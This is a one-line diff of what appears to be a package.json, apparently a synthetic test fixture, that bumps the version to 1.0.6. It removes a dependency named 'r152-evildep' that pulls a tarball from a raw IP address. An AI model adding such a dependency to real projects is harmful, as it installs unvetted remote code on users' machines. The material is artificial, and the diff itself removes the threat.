@@ -1,1 +1,1 @@
-{"name":"ve-r150","version":"1.0.5","scripts":{"test":"node test.js"},"dependencies":{"r152-evildep":"http://62.169.16.65:48207/evildep5.tgz"}}
+{"name":"ve-r150","version":"1.0.6","scripts":{"test":"node test.js"}}
